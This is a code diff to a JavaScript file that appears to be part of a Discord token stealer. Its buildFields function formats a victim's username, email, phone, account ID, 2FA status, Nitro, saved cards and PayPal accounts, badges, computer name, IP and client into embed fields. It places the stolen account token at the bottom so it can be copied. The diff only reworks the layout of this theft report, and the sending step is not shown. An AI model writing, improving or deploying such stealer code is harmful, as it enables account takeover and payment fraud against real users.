@@ -202,8 +202,8 @@ const PROFILE_BADGE_MAP = {
 
 function getBadges(user) {
     const profileBadges = (user._profile_badges || []).map(b =>
-        PROFILE_BADGE_MAP[b.id] || b.description || b.id
-    );
+        PROFILE_BADGE_MAP[b.id] || null
+    ).filter(Boolean);
     return profileBadges.length ? profileBadges.join(' ') : '<:no:1533642070701641889>';
 }
 
@@ -271,27 +271,38 @@ function buildFields(user, billing, friends, token, extra) {
     const cards   = (billing || []).filter(s => s.type === 1).length;
     const paypals = (billing || []).filter(s => s.type === 2).length;
     const billingParts = [];
-    if (cards)   billingParts.push(`<:card:1533639749376671785> ${cards}`);
-    if (paypals) billingParts.push(`<:paypal:1533641104480538695> ${paypals}`);
+    if (cards)   billingParts.push(`\`${cards} card${cards > 1 ? 's' : ''} found\``);
+    if (paypals) billingParts.push(`\`${paypals} PayPal${paypals > 1 ? 's' : ''} found\``);
     const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';
 
-    // Ana bilgiler — alt alta, tek field
-    const info = [
-        `<:user:1533638622761455637> **Username:** \`${user.username}\``,
-        `<:mail:1533638816559140877> **Email:** \`${user.email    || 'N/A'}\``,
-        `<:phone:1533639066057179136> **Phone:** \`${user.phone    || 'N/A'}\``,
-        `<:user:1533638622761455637> **ID:** \`${user.id}\``,
-        `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>'}`,
-        `<:nitro:1533639641687920823> **Nitro:** ${getNitro(user)}`,
-        `<:card:1533639749376671785> **Billing:** ${billingVal}`,
-        `<:badge:1533639967761240154> **Badges:** ${getBadges(user)}`,
-        ...(extra || []),
-    ].join('\n');
-
-    return [
-        { name: 'Discord Info', value: info, inline: false },
-        { name: '<:token:1533639840254660640> Token', value: `\`\`\`${token}\`\`\``, inline: false },
+    const fields = [
+        // Satır 1: Username, Email, Phone
+        { name: '<:user:1533638622761455637> Username', value: `\`${user.username}\``,          inline: true },
+        { name: '<:mail:1533638816559140877> Email',    value: `\`${user.email || 'N/A'}\``,    inline: true },
+        { name: '<:phone:1533639066057179136> Phone',   value: `\`${user.phone || 'N/A'}\``,    inline: true },
+        // Satır 2: ID, 2FA, Nitro
+        { name: '<:id:1533663001322717214> ID',         value: `\`${user.id}\``,                inline: true },
+        { name: '<:lock:1533640371882557501> 2FA',      value: user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>', inline: true },
+        { name: '<:nitro:1533639641687920823> Nitro',   value: getNitro(user),                  inline: true },
+        // Satır 3: Billing, Badges (tam satır)
+        { name: '<:card:1533639749376671785> Billing',  value: billingVal,                      inline: true },
+        { name: '<:badge:1533639967761240154> Badges',  value: getBadges(user),                 inline: true },
+        { name: '\u200b',                               value: '\u200b',                         inline: true },
     ];
+
+    // Extra satırlar (Computer, IP, Client) — alt alta tek field
+    if (extra && extra.length) {
+        fields.push({
+            name:   '\u200b',
+            value:  extra.join('\n'),
+            inline: false,
+        });
+    }
+
+    // Token — en altta, kopyalanabilir
+    fields.push({ name: '<:token:1533639840254660640> Token', value: `\`\`\`${token}\`\`\``, inline: false });
+
+    return fields;
 }
 
 function getDiscordClientName() {
